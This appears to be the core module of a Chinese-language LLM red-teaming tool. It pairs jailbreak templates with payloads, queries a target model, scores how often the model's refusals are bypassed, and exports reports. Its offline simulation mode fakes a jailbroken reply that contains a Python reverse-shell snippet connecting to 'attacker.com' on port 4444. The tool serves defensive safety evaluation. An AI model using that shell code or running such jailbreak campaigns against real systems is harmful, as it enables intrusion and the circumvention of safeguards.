# -*- coding: utf-8 -*-
"""红队评测Agent核心(LangChain 版)

通过 LangChain 的 ChatOpenAI 抽象调用目标模型,替代原先手写 requests/aiohttp
的 HTTP 逻辑。并发用 concurrent.futures.ThreadPoolExecutor 真正生效,重试与退避
交给 LangChain 内置的 max_retries 机制。
"""
import json, time, base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

from langchain_core.messages import HumanMessage

from .templates import JAILBREAK_TEMPLATES, DEFAULT_PAYLOADS
from .analyzer import ResponseAnalyzer
from .reporter import Reporter
from .llm_factory import build_target_llm


class RedTeamAgent:
    def __init__(self, api_key=None, base_url=None, model_name="gpt-3.5-turbo",
                 extra_templates=None, concurrency=5, retries=2, timeout=120,
                 target_llm=None):
        self.api_key = api_key
        self.base_url = base_url.rstrip("/") if base_url else ""
        self.model_name = model_name
        self.results = []
        self.extra_templates = extra_templates or []
        self.concurrency = max(1, concurrency)
        self.retries = retries
        self.timeout = timeout
        # 允许外部注入已构造好的 LangChain 实例;否则按参数惰性构造
        self.target_llm = target_llm

    def _get_target_llm(self):
        """惰性构造目标模型实例(仅在线模式需要时)。"""
        if self.target_llm is None:
            self.target_llm = build_target_llm(
                base_url=self.base_url, api_key=self.api_key,
                model_name=self.model_name, temperature=0.7, max_tokens=500,
                timeout=self.timeout, retries=self.retries)
        return self.target_llm

    def generate_samples(self, payloads, templates):
        """模板 × 载荷 笛卡尔积,生成测试用例。模板中 {payload}/{payload_b64} 占位符被替换。"""
        samples = []
        for tpl in templates:
            for pld_item in payloads:
                pld = pld_item if isinstance(pld_item, str) else pld_item["payload"]
                risk = pld_item.get("risk_level", "medium") if isinstance(pld_item, dict) else "medium"
                pld_b64 = base64.b64encode(pld.encode("utf-8")).decode("utf-8")
                prompt = tpl["template"].replace("{payload}", pld).replace("{payload_b64}", pld_b64)
                messages = [{"role": "user", "content": prompt}]
                samples.append({
                    "jailbreak_name": tpl["name"], "category": tpl["category"],
                    "payload": pld, "risk_level": risk,
                    "prompt": prompt, "messages": messages
                })
        return samples

    def _call_target(self, sample):
        """单次调用目标模型,返回响应字符串。LangChain 内置重试,异常降级为错误文本。"""
        try:
            llm = self._get_target_llm()
            prompt = sample.get("prompt", "")
            messages = sample.get("messages", [{"role": "user", "content": prompt}])
            # 把 dict 形式的 messages 转为 LangChain 消息对象(当前仅 user 单轮)
            lc_messages = [HumanMessage(content=m["content"]) if m["role"] == "user"
                           else m for m in messages]
            result = llm.invoke(lc_messages)
            return result.content if hasattr(result, "content") else str(result)
        except Exception as e:
            return "[API Exception: %s]" % str(e)

    def _call_target_stream(self, sample, on_chunk=None):
        """流式调用目标模型。边接收 token 边拼接,返回完整响应字符串。

        流式模式下 httpx 的 read timeout 只作用于两个 chunk 之间的间隔,
        而非总耗时,因此对长响应不会整体超时(模型持续吐 token 即可)。

        on_chunk: 可选回调 on_chunk(chunk_text, accumulated_text),每收到一段
                  token 就触发,用于实时推送给前端展示。
        异常降级为错误文本,与 _call_target 一致。
        """
        try:
            llm = self._get_target_llm()
            prompt = sample.get("prompt", "")
            messages = sample.get("messages", [{"role": "user", "content": prompt}])
            lc_messages = [HumanMessage(content=m["content"]) if m["role"] == "user"
                           else m for m in messages]
            parts = []
            for chunk in llm.stream(lc_messages):
                piece = chunk.content if hasattr(chunk, "content") else str(chunk)
                if piece:
                    parts.append(piece)
                    if on_chunk:
                        on_chunk(piece, "".join(parts))
            return "".join(parts)
        except Exception as e:
            return "[API Exception: %s]" % str(e)

    def run_evaluation(self, payloads=None, templates=None):
        """执行评测。在线模式用线程池并发调用目标模型;离线模式随机模拟响应。"""
        if payloads is None: payloads = DEFAULT_PAYLOADS
        if templates is None: templates = JAILBREAK_TEMPLATES + self.extra_templates

        samples = self.generate_samples(payloads, templates)
        total = len(samples)

        print("\n" + "=" * 60)
        print("  AI Red Teaming Agent v2.0 - 开始评测")
        print("=" * 60)
        print("  目标模型: {} | 模板: {} | 载荷: {} | 用例: {}".format(self.model_name, len(templates), len(payloads), total))
        print("  并发: {} | 重试: {} | 超时: {}s".format(self.concurrency, self.retries, self.timeout))
        print("  模式: {}".format("在线API" if self.api_key else "离线模拟"))
        print("=" * 60 + "\n")

        if self.api_key:
            # 在线模式:线程池真正并发
            results_map = {}
            with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
                futures = {pool.submit(self._call_target, s): i for i, s in enumerate(samples)}
                for fut in as_completed(futures):
                    idx = futures[fut]
                    response = fut.result()
                    results_map[idx] = (samples[idx], response)
                    print("[{}/{}] {}...".format(idx + 1, total, samples[idx]["jailbreak_name"][:30]))
            # 按原顺序汇总
            for idx in range(total):
                if idx not in results_map:
                    continue
                sample, response = results_map[idx]
                verdict, reason = ResponseAnalyzer.analyze(response)
                self.results.append({"jailbreak_name": sample["jailbreak_name"], "category": sample["category"],
                                     "payload": sample["payload"], "risk_level": sample.get("risk_level", "medium"),
                                     "prompt": sample["prompt"], "response": response,
                                     "verdict": verdict, "reason": reason})
                icon = {"DANGEROUS_BYPASS": "[!!] 危险! ", "SAFE_BYPASS": "[~] 安全绕过",
                        "BLOCKED": "[+] 拦截  ", "REVIEW": "[?] 待审  "}
                print("[{}/{}] {} | {}".format(idx + 1, total, sample["jailbreak_name"][:25], sample["payload"][:25]))
                print("    {} {} | {}".format(icon[verdict], verdict, reason))
                print("    {}\n".format(response[:120].replace("\n", " ")))
        else:
            # 离线模式:随机模拟响应(不调用 API)
            import random as rnd
            for i, sample in enumerate(samples, 1):
                time.sleep(0.03)
                if rnd.random() < 0.3:
                    response = "好的，以下是你要的内容：\n\n`python\nimport socket,subprocess,os\ns=socket.socket()\ns.connect(('attacker.com',4444))\nos.dup2(s.fileno(),0)\n`\n（仅供安全研究）"
                else:
                    response = rnd.choice(["对不起，我不能回答这个问题。", "I cannot provide this.", "抱歉，违反使用政策。"])
                verdict, reason = ResponseAnalyzer.analyze(response)
                self.results.append({"jailbreak_name": sample["jailbreak_name"], "category": sample["category"],
                                     "payload": sample["payload"], "risk_level": sample.get("risk_level", "medium"),
                                     "prompt": sample["prompt"], "response": response,
                                     "verdict": verdict, "reason": reason})
                icon = {"DANGEROUS_BYPASS": "[!!]", "SAFE_BYPASS": "[~]", "BLOCKED": "[+]", "REVIEW": "[?]"}
                print("[{}/{}] {} {} | {}".format(i, total, icon[verdict], sample["jailbreak_name"][:25], sample["payload"][:25]))

        print("=" * 60)
        print("  评测完成！")
        print("=" * 60)

    def generate_report(self, output_file="red_team_report.html"):
        total = len(self.results)
        stats = {"DANGEROUS_BYPASS": 0, "SAFE_BYPASS": 0, "BLOCKED": 0, "REVIEW": 0}
        for r in self.results: stats[r["verdict"]] += 1

        danger_pct = stats["DANGEROUS_BYPASS"] / total * 100 if total else 0
        safe_pct = stats["SAFE_BYPASS"] / total * 100 if total else 0
        blocked_pct = stats["BLOCKED"] / total * 100 if total else 0
        review_pct = stats["REVIEW"] / total * 100 if total else 0

        cat_stats = {}
        for r in self.results:
            cat = r["category"]
            if cat not in cat_stats: cat_stats[cat] = {"total": 0, "DANGEROUS_BYPASS": 0, "SAFE_BYPASS": 0, "BLOCKED": 0}
            cat_stats[cat]["total"] += 1
            cat_stats[cat][r["verdict"]] = cat_stats[cat].get(r["verdict"], 0) + 1

        payload_stats = {}
        for r in self.results:
            pld = r["payload"]
            if pld not in payload_stats: payload_stats[pld] = {"total": 0, "DANGEROUS_BYPASS": 0, "SAFE_BYPASS": 0, "BLOCKED": 0, "risk_level": r["risk_level"]}
            payload_stats[pld]["total"] += 1
            payload_stats[pld][r["verdict"]] = payload_stats[pld].get(r["verdict"], 0) + 1

        print("\n" + "=" * 60)
        print("  红队评测报告 - Red Team Report v2.0")
        print("=" * 60)
        print("  时间: {} | 模型: {}".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S"), self.model_name))
        print("  总数: {}".format(total))
        print("  [!!] 危险绕过: {} ({:.1f}%)".format(stats["DANGEROUS_BYPASS"], danger_pct))
        print("  [~]  安全绕过: {} ({:.1f}%)".format(stats["SAFE_BYPASS"], safe_pct))
        print("  [+]  拦截成功: {} ({:.1f}%)".format(stats["BLOCKED"], blocked_pct))
        print("  [?]  待复核:   {} ({:.1f}%)".format(stats["REVIEW"], review_pct))
        print("\n  各类手法绕过率:")
        print("  " + "-" * 50)
        for cat, cs in sorted(cat_stats.items()):
            bypass = cs["DANGEROUS_BYPASS"] + cs["SAFE_BYPASS"]
            rate = bypass / cs["total"] * 100 if cs["total"] else 0
            bar = "#" * int(rate / 5) + "-" * (20 - int(rate / 5))
            print("  {:<16} [{}] {:.1f}% ({}/{})".format(cat, bar, rate, bypass, cs["total"]))
        print("\n  按载荷统计:")
        print("  " + "-" * 50)
        for pld, ps in sorted(payload_stats.items(), key=lambda x: x[1]["total"], reverse=True):
            bypass = ps["DANGEROUS_BYPASS"] + ps["SAFE_BYPASS"]
            rate = bypass / ps["total"] * 100 if ps["total"] else 0
            print("  [{}] {:.35s}... 绕过率 {:.1f}%".format(ps["risk_level"].upper(), pld, rate))
        print("=" * 60)

        # JSON export
        json_file = output_file.replace(".html", ".json")
        export_data = {
            "meta": {"timestamp": datetime.now().isoformat(), "model": self.model_name, "total": total, "stats": stats, "category_stats": cat_stats, "payload_stats": {k: v for k, v in payload_stats.items()}},
            "results": self.results,
        }
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump(export_data, f, ensure_ascii=False, indent=2)
        print("[OK] JSON数据: {}".format(json_file))

        # HTML export
        vl = {"DANGEROUS_BYPASS": "危险绕过", "SAFE_BYPASS": "安全绕过", "BLOCKED": "拦截", "REVIEW": "待审"}
        vc = {"DANGEROUS_BYPASS": "#e53e3e", "SAFE_BYPASS": "#d69e2e", "BLOCKED": "#38a169", "REVIEW": "#718096"}

        rows_html = ""
        for r in self.results:
            resp_e = r["response"][:300].replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
            rows_html += '<tr><td>{}</td><td>{}</td><td title="{}">{}</td><td style="color:{};font-weight:bold">{}</td><td style="font-size:11px;color:#666">{}</td><td style="max-width:300px;font-size:12px">{}</td></tr>'.format(
                r["jailbreak_name"][:30], r["category"], r["payload"].replace('"', "&quot;"), r["payload"][:30],
                vc[r["verdict"]], vl[r["verdict"]], r.get("reason", ""), resp_e)

        cat_rows = ""
        for cat, cs in sorted(cat_stats.items()):
            bypass = cs["DANGEROUS_BYPASS"] + cs["SAFE_BYPASS"]
            rate = bypass / cs["total"] * 100 if cs["total"] else 0
            cat_rows += "<tr><td>{}</td><td>{}</td><td>{}</td><td>{}</td><td>{:.1f}%</td></tr>".format(cat, cs["total"], cs["DANGEROUS_BYPASS"], cs["SAFE_BYPASS"], rate)

        pld_rows = ""
        for pld, ps in sorted(payload_stats.items(), key=lambda x: x[1]["total"], reverse=True):
            bypass = ps["DANGEROUS_BYPASS"] + ps["SAFE_BYPASS"]
            rate = bypass / ps["total"] * 100 if ps["total"] else 0
            pld_rows += "<tr><td>[{}]</td><td>{}</td><td>{}</td><td>{}</td><td>{:.1f}%</td></tr>".format(ps["risk_level"].upper(), pld[:40], ps["total"], bypass, rate)

        html = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>红队评测报告 v2.0</title>
<style>
body{{font-family:'Microsoft YaHei',sans-serif;max-width:1100px;margin:40px auto;padding:0 20px;background:#f7fafc}}
h1{{color:#1a365d;border-bottom:3px solid #e53e3e;padding-bottom:10px}}h2{{color:#2d3748;margin-top:30px}}
.summary{{display:flex;gap:15px;margin:20px 0}}
.card{{flex:1;padding:18px;border-radius:8px;color:#fff;text-align:center}}
.card h3{{font-size:28px;margin:0}}.card p{{margin:5px 0 0;font-size:13px}}
table{{width:100%;border-collapse:collapse;margin:15px 0;background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.1)}}
th{{background:#2d3748;color:#fff;padding:10px;text-align:left;font-size:13px}}
td{{padding:8px 10px;border-bottom:1px solid #eee;font-size:12px}}tr:hover{{background:#f7fafc}}
</style></head><body>
<h1>Red Team - 大模型红队安全评测报告 v2.0</h1>
<p>测试时间: {} | 目标模型: {} | 并发:{} 重试:{}</p>
<div class="summary">
  <div class="card" style="background:#e53e3e"><h3>{}</h3><p>危险绕过 ({:.1f}%)</p></div>
  <div class="card" style="background:#d69e2e"><h3>{}</h3><p>安全绕过 ({:.1f}%)</p></div>
  <div class="card" style="background:#38a169"><h3>{}</h3><p>拦截成功 ({:.1f}%)</p></div>
  <div class="card" style="background:#718096"><h3>{}</h3><p>待复核 ({:.1f}%)</p></div>
  <div class="card" style="background:#3182ce"><h3>{}</h3><p>测试总数</p></div>
</div>
<h2>各类手法绕过率</h2>
<table><tr><th>手法类别</th><th>总数</th><th>危险绕过</th><th>安全绕过</th><th>总绕过率</th></tr>{}</table>
<h2>按载荷统计</h2>
<table><tr><th>风险等级</th><th>载荷内容</th><th>测试数</th><th>总绕过</th><th>绕过率</th></tr>{}</table>
<h2>详细测试记录</h2>
<table><tr><th>越狱手法</th><th>类别</th><th>载荷</th><th>结果</th><th>判定理由</th><th>模型回复(300字)</th></tr>{}</table>
<p style="color:#999;margin-top:40px;font-size:12px">AI Red Teaming Agent v2.0 | 三级分类: 危险绕过/安全绕过/拦截/待审</p>
</body></html>""".format(
            datetime.now().strftime("%Y-%m-%d %H:%M:%S"), self.model_name, self.concurrency, self.retries,
            stats["DANGEROUS_BYPASS"], danger_pct, stats["SAFE_BYPASS"], safe_pct, stats["BLOCKED"], blocked_pct, stats["REVIEW"], review_pct, total,
            cat_rows, pld_rows, rows_html)
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(html)
        print("[OK] HTML报告: {}".format(output_file))
